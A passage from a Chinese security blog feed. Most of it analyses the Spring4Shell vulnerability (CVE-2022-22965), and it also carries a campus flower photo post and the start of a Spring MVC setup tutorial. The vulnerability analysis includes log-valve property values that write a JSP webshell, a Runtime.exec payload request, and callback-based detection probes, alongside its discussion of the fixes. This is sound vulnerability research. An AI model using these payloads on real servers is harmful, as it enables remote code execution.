  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">int</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getMaxLogMessageBufferSize</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setMaxLogMessageBufferSize</span><span class="o">(</span><span class="kt">int</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">next</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">Valve</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">ValveBase</span><span class="o">.</span><span class="na">getNext</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">ValveBase</span><span class="o">.</span><span class="na">setNext</span><span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">Valve</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">objectName</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kd">final</span> <span class="n">javax</span><span class="o">.</span><span class="na">management</span><span class="o">.</span><span class="na">ObjectName</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LifecycleMBeanBase</span><span class="o">.</span><span class="na">getObjectName</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kc">null</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">objectNameKeyProperties</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">ValveBase</span><span class="o">.</span><span class="na">getObjectNameKeyProperties</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kc">null</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">pattern</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getPattern</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setPattern</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">prefix</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">getPrefix</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setPrefix</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">renameOnRotate</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">isRenameOnRotate</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setRenameOnRotate</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">requestAttributesEnabled</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getRequestAttributesEnabled</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setRequestAttributesEnabled</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">rotatable</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">isRotatable</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setRotatable</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">state</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">LifecycleState</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LifecycleBase</span><span class="o">.</span><span class="na">getState</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kc">null</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">stateName</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LifecycleBase</span><span class="o">.</span><span class="na">getStateName</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kc">null</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">suffix</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">getSuffix</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setSuffix</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">throwOnFailure</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LifecycleBase</span><span class="o">.</span><span class="na">getThrowOnFailure</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LifecycleBase</span><span class="o">.</span><span class="na">setThrowOnFailure</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
</code></pre></div></div>

<p>从类名得知我们可以通过修改访问成功的日志文件，来写入jsp。</p>

<p>默认的配置为：</p>

<pre><code class="language-txt">class.classLoader.resources.context.parent.pipeline.first.directory =logs
class.classLoader.resources.context.parent.pipeline.first.prefix =localhost_access_log
class.classLoader.resources.context.parent.pipeline.first.suffix = .txt
class.classLoader.resources.context.parent.pipeline.first.fileDateFormat =.yyyy-mm-dd
</code></pre>

<p>我们可以修改为：</p>

<pre><code class="language-txt">class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT

class.classLoader.resources.context.parent.pipeline.first.prefix=shell

class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
</code></pre>

<p>这有点像phpmyadmin通过日志文件写马的思路，不过日志文件rce都大同小异。</p>

<p>这样随意访问<code class="language-plaintext highlighter-rouge">/?a=&lt;%Runtime.getRuntime().exec("open -a Calculator");%&gt;</code>即可写入恶意语句。</p>

<h2 id="为何需要jdk9">为何需要JDK9？</h2>

<p>至此，其实答案也算比较明了了，CVE-2010-1622后Spring采用了黑名单限制了<code class="language-plaintext highlighter-rouge">class.classLoader</code>，而JDK9引入了<a href="https://blog.csdn.net/charles_neil/article/details/114460702"> Module</a> 机制，可以通过<code class="language-plaintext highlighter-rouge">class.module.classLoader</code>绕过黑名单，CVE-2022-22965 本质上就是 CVE-2010-1622上 的一个绕过。</p>

<h2 id="arrayset-的一个误区">Array.set 的一个误区</h2>

<p>在不少的文章中，都有谈到如果需要set的属性是array类型，会有意想不到的效果。</p>

<p>我们模拟一下以下场景，给<code class="language-plaintext highlighter-rouge">User</code>类多加了一个age属性，但是并没有设置其set方法。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login5"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">login5</span><span class="o">(</span><span class="nc">User</span> <span class="n">user</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
    <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="n">user</span><span class="o">.</span><span class="na">getUsername</span><span class="o">());</span>
    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getAge</span><span class="o">());</span>
    <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
<span class="o">}</span>
<span class="o">...</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">User</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">username</span><span class="o">;</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">password</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kt">int</span> <span class="n">age</span><span class="o">;</span>

    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getAge</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">age</span><span class="o">;</span>
    <span class="o">}</span>
  <span class="o">...</span>
<span class="o">}</span>
</code></pre></div></div>

<p>发送请求<code class="language-plaintext highlighter-rouge">http://localhost:8080/login5?username=theoyu&amp;age=10</code>，终端不出意外的打印了0。</p>

<p>我们改写一下属性，增添一个数组类型ages，同样不设置set方法：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login5"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">login5</span><span class="o">(</span><span class="nc">User</span> <span class="n">user</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
    <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="n">user</span><span class="o">.</span><span class="na">getUsername</span><span class="o">());</span>
    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getAges</span><span class="o">()[</span><span class="mi">0</span><span class="o">]);</span>
    <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
<span class="o">}</span>
<span class="o">...</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">User</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">username</span><span class="o">;</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">password</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kt">int</span><span class="o">[]</span> <span class="n">ages</span> <span class="o">=</span> <span class="o">{</span><span class="mi">0</span><span class="o">};</span>

    <span class="kd">public</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">getAges</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">ages</span><span class="o">;</span>
    <span class="o">}</span>
  <span class="o">...</span>
<span class="o">}</span>
</code></pre></div></div>

<p>发送请求<code class="language-plaintext highlighter-rouge">http://localhost:8080/login5?username=theoyu&amp;ages[0]=10</code>，</p>

<p>我们会发现终端居然输出了10！这和我们之前所想的不一样，没有set方法居然也可以绑定私有属性的值。</p>

<p>具体位置在：<code class="language-plaintext highlighter-rouge">AbstractNestablePropertyAccessor.processKeyedProperty</code></p>

<p>实际上除了Array类型，Map、Set类型也同样可以直接赋值：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220422190501.png" alt="image-20220421182917229" /></p>

<p>我认为这应该只是对特定类型的一种补充，但有不少文章都把这个特性纳入到了最后的属性注入上去，这是我不太能理解的点，因为目前来看我们利用的属性还没有需要用到这个特性的。</p>

<h2 id="单应用启动会受影响吗">单应用启动会受影响吗？</h2>

<p>下图为tomcat war包启动，获取到的classLoader：WebappClassLoader</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175457.png" alt="image-20220421110653486" /></p>

<p>下图为单应用（springboot jar）启动，获取到的classLoader：JDK自带的AppClassLoader</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175459.png" alt="image-20220421110809107" /></p>

<p>两者的差别在于获取到classLoader的后利用上，WebappClassLoader采用了类隔离机制(之前RASP这块踩了好多坑)，拥有更多的属性，所以只是在拓展面上有所差异，不过我们目前所已知的利用方法都是在WebappClassLoader上。</p>

<h2 id="无害探测">无害探测</h2>

<p>如果我们想写一个poc，批量验证漏洞，该怎么做呢？</p>

<p>当然可以直接用现有exp的方式，日志写马。</p>

<p>但是作为 <strong>Proof Of Concept</strong>，我们还是希望把侵入性化为最小，这样来看修改日志文件肯定不合适，而且这样甚至有可能会把业务打崩，我们需要从其他属性入手。</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">class.module.classLoader.DefaultAssertionStatus</code>:</li>
</ol>

<p>该属性的set方法传参为bool类型，如果传入0、1正常，其他字符返回400，可作为判断依据。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class.module.classLoader.DefaultAssertionStatus=0
class.module.classLoader.DefaultAssertionStatus=x
</code></pre></div></div>

<p>这样我们可以通过发两次包，从两次的返回状态码进行判断。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421231217.png" alt="image-20220421225051339" /></p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">class.module.classLoader.resources.context.configFile</code></li>
</ol>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421231222.png" alt="image-20220421225545352" /></p>

<p>位于<code class="language-plaintext highlighter-rouge">org.apache.catalina.core.StandardContext</code>的<code class="language-plaintext highlighter-rouge">configFile</code>属性为URL类型， 默认为file协议，访问缓存在本地的xml文件，可修改为http协议达到反连检测的目的。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:8080/login5?username=theoyu&amp;class.module.classLoader.resources.context.configFile=http://127.0.0.1:20022&amp;class.module.classLoader.resources.context.configFile.content.config=config.conf
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421231225.png" alt="image-20220421231211477" /></p>

<p>以上两种方法均已添加至 <a href="https://github.com/yuuuuu422/Gopo">Gopo</a>的YAML规则。</p>

<h2 id="漏洞修复">漏洞修复</h2>

<p>和 CVE-2010-1622 漏洞一样，Spring官方和Tomcat都对这个漏洞进行了修复。</p>

<p>Spring官方做了两点限制，一是把黑名单改为了白名单：要求<code class="language-plaintext highlighter-rouge">pd.getName</code>必须是以『Name』结尾，而是返回的类型不能为<code class="language-plaintext highlighter-rouge">classLoader</code>类型。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421234356.png" alt="image-20220421191637423" /></p>

<p>Tomcat则直接把获取resources的方法给改成了<code class="language-plaintext highlighter-rouge">return null</code>。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421234400.png" alt="image-20220421190048440" /></p>

<p>如果还想进一步绕过的话，可以通过 … 如果我知道的话 …</p>

<h2 id="参考">参考</h2>

<ul>
  <li><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">廖雪峰的官方网站 JavaBean</a></li>
  <li><a href="https://cloud.tencent.com/developer/article/1035297">Struts2 S2-020在Tomcat 8下的命令执行分析</a></li>
  <li>
    <p><a href="https://xz.aliyun.com/t/11129#toc-0">Spring Beans RCE分析</a></p>
  </li>
  <li>
    <p><a href="http://rui0.cn/archives/1158">SpringMVC框架任意代码执行漏洞(CVE-2010-1622)分析</a></p>
  </li>
  <li><a href="https://blog.csdn.net/charles_neil/article/details/114460702">JDK9 - Module</a></li>
</ul>]]></content><author><name>Theoyu</name></author><category term="VUL-Reproduce" /><category term="JAVA" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">学校里的花开了</title><link href="https://theoyu.top/2022/essay/TheFlower" rel="alternate" type="text/html" title="学校里的花开了" /><published>2022-04-09T00:00:00+08:00</published><updated>2022-04-09T00:00:00+08:00</updated><id>https://theoyu.top/2022/essay/TheFlower</id><content type="html" xml:base="https://theoyu.top/2022/essay/TheFlower"><![CDATA[<!--more-->

<div><iframe class="extensions extensions--audio" width="330" height="86" src="//music.163.com/outchain/player?type=2&amp;id=41632486&amp;auto=1&amp;height=66" frameborder="no" border="0" marginwidth="0" marginheight="0">
</iframe>
</div>

<p>发现之前博客里全是技术或者学习相关的文章，我觉得还是应该好好经营一下。</p>

<p>刚好春天到了，学校里的花也都开了，那就带大家一起看看我们学校的花吧～</p>

<p><img src="/assets/images/image-20220409131808085.png" alt="image-20220409131808085" /></p>

<p><img src="/assets/images/image-20220409131835381.png" alt="image-20220409131835381" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">第一次p图，曝光度好像调高了🥲</center>

<p><img src="/assets/images/image-20220410193632010.png" alt="image-20220410193632010" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">最近看已是绿色</center>

<p><img src="/assets/images/image-20220409131913827.png" alt="image-20220409131913827" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">天空很蓝诶～</center>

<p><img src="/assets/images/image-20220420131844261.png" alt="image-20220420131844261" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">Its name is heather : (</center>

<p><img src="/assets/images/image-20220409134551627.png" alt="image-20220409134551627" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">从樱花大道🛹下来真滴爽～</center>

<p><img src="/assets/images/image-20220420132254262.png" alt="image-20220420132254262" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">俺种的康乃馨</center>

<p><img src="/assets/images/image-20220409142047296.png" alt="image-20220409142047296" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">tt拍的这张很有感觉</center>

<p><img src="/assets/images/image-20220409134531053.png" alt="image-20220409134531053" /></p>

<p><img src="/assets/images/image-20220421175840298.png" alt="image-20220421175840298" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">终有凋谢的一天</center>

<p><img src="/assets/images/image-20220409131957709.png" alt="image-20220409131957709" /></p>

<center style="font-size:14px;color:#C0C0C0;text-decoration:underline">Siyu的构图和选景都感觉很巧妙</center>

<blockquote>
  <p>再过一个春天，就是该分别的时候了</p>
</blockquote>]]></content><author><name>Theoyu</name></author><category term="essay" /><category term="essay" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">study springMVC 基础配置</title><link href="https://theoyu.top/2022/springMVC01" rel="alternate" type="text/html" title="study springMVC 基础配置" /><published>2022-04-06T00:00:00+08:00</published><updated>2022-04-06T00:00:00+08:00</updated><id>https://theoyu.top/2022/springMVC01</id><content type="html" xml:base="https://theoyu.top/2022/springMVC01"><![CDATA[<p>接触java以来web相关的东西都是springboot开箱即用，基本上没有配置过springMVC，打算还是从0到1接触接触。</p>

<!--more-->

<h2 id="0x00-spring-mvc是什么">0x00 spring MVC是什么</h2>

<ul>
  <li>
    <p>数据模型层（Model）：模型对象拥有最多的处理任务，是应用程序的主体部分，它负责数据逻辑（业务规则）的处理和实现数据操作（即在数据库中存取数据）。</p>
  </li>
  <li>
    <p>视图层（View）：负责格式化数据并把它们呈现给用户，包括数据展示、用户交互、数据验证、界面设计等功能。</p>
  </li>
  <li>
    <p>控制层（Controller）：负责接收并转发请求，对请求进行处理后，指定视图并将响应结果发送给客户端。</p>
  </li>
</ul>

<p>网上随便搜索就有很多关于MVC的概念，在spring中，JavaBean作为数据分装(Model)，JSP可用作数据显示(View)，Servlet则是处理用户请求(Controller)，刚好一一对应上述的MVC。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220410120311.png" alt="image-20220409235704925" /></p>

<h2 id="0x01-快速启用">0x01 快速启用</h2>

<p>创建项目选择 <strong>Java Enterprise</strong></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220410120314.png" alt="image-20220409225544372" /></p>

<p>在<strong>dependencies</strong>中选择以下两项：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220410120318.png" alt="image-20220409225923947" /></p>

<p>之后在<code class="language-plaintext highlighter-rouge">pom.xml</code>中添加：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;properties&gt;</span>
        <span class="nt">&lt;project.build.sourceEncoding&gt;</span>UTF-8<span class="nt">&lt;/project.build.sourceEncoding&gt;</span>
        <span class="nt">&lt;maven.compiler.target&gt;</span>1.8<span class="nt">&lt;/maven.compiler.target&gt;</span>
        <span class="nt">&lt;maven.compiler.source&gt;</span>1.8<span class="nt">&lt;/maven.compiler.source&gt;</span>
        <span class="nt">&lt;junit.version&gt;</span>5.8.1<span class="nt">&lt;/junit.version&gt;</span>
        <span class="nt">&lt;spring.version&gt;</span>4.3.6.RELEASE<span class="nt">&lt;/spring.version&gt;</span>
    <span class="nt">&lt;/properties&gt;</span>
......
<span class="nt">&lt;dependencies&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>javax<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>javaee-web-api<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>8.0.1<span class="nt">&lt;/version&gt;</span>
            <span class="nt">&lt;scope&gt;</span>provided<span class="nt">&lt;/scope&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>javax.mvc<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>javax.mvc-api<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>1.0.0<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.junit.jupiter<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>junit-jupiter-api<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${junit.version}<span class="nt">&lt;/version&gt;</span>
            <span class="nt">&lt;scope&gt;</span>test<span class="nt">&lt;/scope&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.junit.jupiter<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>junit-jupiter-engine<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${junit.version}<span class="nt">&lt;/version&gt;</span>
            <span class="nt">&lt;scope&gt;</span>test<span class="nt">&lt;/scope&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-context<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-core<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-beans<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-context-support<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-aop<span class="nt">&lt;/artifactId&gt;</span>
